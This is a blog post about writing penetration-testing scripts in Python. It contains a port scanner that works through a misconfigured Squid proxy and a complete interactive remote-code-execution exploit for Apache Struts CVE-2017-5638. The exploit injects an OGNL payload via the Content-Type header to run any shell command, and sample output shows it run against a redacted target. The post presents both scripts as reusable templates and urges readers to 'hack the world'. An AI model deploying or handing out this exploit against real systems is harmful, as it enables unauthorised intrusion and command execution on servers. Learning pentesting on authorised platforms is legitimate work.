---
layout: post
title: Black Hat Programming
author: lokori
excerpt: Let's explore the art of Black Hat Programming, which is anything but your regular professional software development. How to exploit security vulnerabilities using Python like a pro?
tags:
- Python
- hacking
- infosec
- software security
- devsecops
- exploit
---


## Enter Black Hat Programming

Forget automated tests. Never mind Facade, Decorator or other OOP design patterns. Static type systems? Quickly, toss them out of the way. It's time to exploit some security flaws and no amount of so called "professional software development" is going to help with that. Welcome to the world of Black Hat Programming!

![Black hat](/img/blackhat/blackhat.jpg)

In lack of a better term, Black Hat Programming is the art of writing tools and scripts for penetration testing and expoiting vulnerabilities. Just don't go poking around without permission and become a Black Hat hunted by the police. But why don't we need all those "best practices" that are very useful normally in professional software development? The "black hat programming" discussed in this post typically deals in a simpler world:

* The programs are usually quite small. Maybe less than 100 lines, hardly ever more than 1000 LOC.
* They are single user apps, often without a persistent state or any fancy UI. 
* After the program works, it becomes pretty static. The vuln is what it is and the requirements do not change.
* The end user is a hacker who knows about security, technical stuff and programming. The programmers are 
  the first end users of their scripts.
 
Because of these characteristics, there is no need to do sprints, UX design, paper prototypes, automated tests.
You can kiss your pair programming goodbye. And what kind of person starts arguing about the coding style 
and architectural patterns when the whole script is about 50 lines of code? If it works and the code
is understandable, it's a success! O brave new world, that has such programmers in it!

## Choose productivity, Choose Pwnage. Choose Python.

The field of security is wide, dealing often with bit operations, opcodes, crypto and hash algoritms,
databases and network protocols. Therefore the ideal programming language needs to handle everything easily and 
have a wide variety of libraries ready to do the heavy lifting. Java, C# and many others are qualified in this sense.

But Java, C# and some other "professional" programming languages get left behind when getting things done becomes paramount. A 
hacker doesn't want to spend time designing types and classes and wondering what **erasure** or **generics** means. It's
about the speed of development - just hack together the idea, test until it stops bleeding.. and profit! [Cowboy coding](https://en.wikipedia.org/wiki/Cowboy_coding) is a natural fit.

It is no wonder that Python is the absolute favorite of pen testers and hackers all over the world. Perl might become a distant second and lately there has been some interest in Go. And there is Ruby as  the widely used [Metasploit](https://www.metasploit.com/) is Ruby-based. But Python is the high-king of this realm and a very well liked king he is. Long may he reign!

![King Python](/img/blackhat/python-book.jpg)

## Let's hack!

Okay, enough talk, let's write some Black Hat Python then, shall we? Remember, these are quickly written scripts that are godo enough to get the job done and 
serve as templates for the next time something similar is needed. This is the craft of quickly making tools when a need arises, not a craft of making reliable
distributed systems that are modular and maintainable.


### Scanning ports behind a squid proxy

If a [Squid HTTP proxy](http://www.squid-cache.org/) is not properly configured, it can  expose ports and services behind it that are not directly visible to outside world. This might give us more insight into the machine and othe systems connected to it. And this could even be abused to [smuggle SSH protocol over Squid proxy](https://daniel.haxx.se/docs/sshproxy.html). The poor proxy gets confused and thinks it's HTTP traffic. 


**Portscanner.py**
```
import requests
import argparse

parser = argparse.ArgumentParser(description='Port scan through proxy')
parser.add_argument('httpproxy', type=str, help='host:port for proxy')
parser.add_argument('host', type=str, help='host to scan')
parser.add_argument('begin', type=int, help='Port scan lower range', default=1)
parser.add_argument('end', type=int, help='Port scan upper range', default=1000)

args = parser.parse_args()

proxies = {
  'http': args.httpproxy
}

URL = 'http://' + args.host

openports=set()

for portto in range(args.begin, args.end):
    repla = requests.get(URL + ':' + str(portto), proxies=proxies)
    if (not ('(111) Connection refused' in repla.text)): 
      print('------ PORT : ' + str(portto))
      print(repla.text)
      openports.add(portto)
    if ((portto % 19) == 18):
      print("still working .. (port " + str(portto) + ")")
    
print("----------------")
print("SCAN COMPLETE")
print("----------------")
print("OPEN PORTS: ")
for portto in openports:
  print(portto)
```


The scanner takes necessary information for the scan from command line arguments. Then it simply sends requests in a single thread and detects open ports based on the reply it gets from the squid proxy. After every 19th requested port it reports that it's still running so that we can see progress. Very straightforward, but not stealthy or very professional. Yet, very handy.

Not convinced yet? Let's take another example.

### Abusing Struts to gain a "shell" with RCE vulnerability

Remote Code Execution (RCE) is one of the coolest security vulnerabilities one can find in a system. Sometimes it's as easy as putting the command in one HTTP GET parameter, but usually it involves some tricks.

The [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/) is one link in a long chain of RCE vulnerabilities related to OGNL handling in [Apache Struts](https://struts.apache.org/). For example, see [CVE-2013-1965](https://www.cvedetails.com/cve/CVE-2013-1965/), [CVE-2013-2134](https://www.cvedetails.com/cve/CVE-2013-2134/) or [CVE-2016-4461](https://www.cvedetails.com/cve/CVE-2016-4461/). Input handling is still difficult.

The CVE-2017-5638 tells us that we can execute Java code by sending it in *Content-Type* header. And since nobody really uses the Java security restrictions, we can call system exec and execute pretty much any operating system commands. Of course we are still limited by the user privileges of the user running the Struts application, but it's still huge. Manually crafting the payloads is tedious, so let's create a "shell" with Python. I have written other similar shells for other vulnerabilities, so this can serve as a template for exploiting other RCE vulnerabilities as well.

**strutser.py**
```
#!/usr/bin/python
#
# Apache Struts RCE exploiter CVE-2017-5638, shell-like experience

import os
import sys
import base64
import socket
import urllib
import requests

def runStruts(cmd, URL, PROXY):

  payload = "%{(#_='multipart/form-data')."
  payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
  payload += "(#_memberAccess?"
  payload += "(#_memberAccess=#dm):"
  payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
  payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
  payload += "(#ognlUtil.getExcludedPackageNames().clear())."
  payload += "(#ognlUtil.getExcludedClasses().clear())."
  payload += "(#context.setMemberAccess(#dm))))."
  payload += "(#cmd='%s')." % cmd
  payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
  payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
  payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
  payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
  payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
  payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
  payload += "(#ros.flush())}"

  # dee bug
  # print(payload)

  # For some reason it started working when piped through Burp proxy
  proxies={}
  if (PROXY != None):
    proxies = {
      'http': PROXY
    }

  # print("gonna run some struts now..")
  headerz = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
  try:
    r = requests.get(URL, headers=headerz, proxies=proxies)
    print("-------------------------------- DA REPLY --------")
    print(r.text)
  except requests.exceptions.ChunkedEncodingError, e:
    pass


# USE LIKE: python strutser.py http://vulnerable.legacy.sys/Monitoring.action http://127.0.0.1:8510
URL = sys.argv[1]
print("URL: " + URL)
proxy = None
if (len(sys.argv) > 2):
  proxy = sys.argv[2]
  print("PROXY URL: " + proxy)
while True:
  try:
    cmd = raw_input('>> ')
  except EOFError:
    break
  runStruts(cmd, URL, proxy)
```


Let's see it in action!

```
python strutser.py  http://VULN.TARGET.COM:8080/REDACTED.action http://127.0.0.1:8510
URL: http://VULN.TARGET.COM:8080/REDACTED.action
PROXY URL: http://127.0.0.1:8510
>> ls
-------------------------------- DA REPLY --------
conf
db_connect
lib
logs
policy
webapps
work
```

Awesome! The Python script hides and abstracts away the hideous details of uploading and executing commands on the remote server and we can concentrate on advancing our nefarious purposes.

## Further material

If this looks like something you would love to do, please go ahead and start hacking! I recommend [Hack The Box](https://www.hackthebox.eu) as a platform where to hone and test your skills. But there are also books. [Black Hat Python](https://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900) inspired my to write this post and it contains more examples of Black Hat Programming demonstrated in this blog post.

![Black Hat Python](/img/blackhat/blackhat-book.jpeg)

[Advanced Penetration Testing](https://www.amazon.com/Advanced-Penetration-Testing-Hacking-Networks/dp/1119367689) uses many languages and offers more technically challenging ideas. What would writing your own botnet client + server with C sound? Using SSH protocol to encrypt your botnet communications with your own customized SSH client and server. An excellent book.

Third book I can recommend on this genre is [Hacking: The Art of Exploitation, 2nd edition](https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/). It deals with buffer overflows and many other topics with concrete hands-on exercises.

But whether you read books or not, they are not novels. They are just inspiration and ideas, but learning happens by hacking and actually writing code. Go and hack the world now!
